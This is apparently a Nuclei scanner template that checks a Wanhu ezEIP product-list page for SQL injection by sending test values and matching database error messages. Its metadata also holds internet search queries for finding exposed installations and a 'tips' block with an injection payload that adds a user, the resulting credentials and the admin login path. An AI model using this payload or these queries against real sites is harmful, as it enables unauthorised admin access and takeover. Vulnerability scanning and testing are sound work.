id: wanhu-ezeip-productlist-sqli-to-useradd

info:
  name: 万户 ezeip productlist.aspx - sqli
  author: pphua
  severity: high
  description:
  reference:
    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7ezEIP%E4%BC%81%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fproductlist.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    veified: true
    fofa-query: body="ezEIP" || header="ezEIP" || body="css/css_whir.css"
    hunter-query: app.name="万户 ezEip"
    tips:
      - 添加用户 payload: /shop/productlist.aspx?ob=price&price=asc&svids=1);declare%20@@s%20varchar(2000)%20set%20@@%20execute(@@s)--+
      - 用户名: check_0day_vul
      - 登录密码: Qin_test_0day!  
      - 后台登录地址: /whir_system/module/security/ezEIP_login.aspx
  tags: wanhu,oa,ezeip,useradd,sqli


http:
  - raw:
      - |
        GET /shop/productlist.aspx?ob=price&price=asc&svids=cnvd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36

      - |
        GET /shop/productlist.aspx?ob=price&price=asc&svids=cnvd; HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains_all(body_1,'错误信息','列名','HttpUnhandledException')
          - contains_all(body_2,'错误信息','附近有语法错误','HttpUnhandledException')
        condition: and



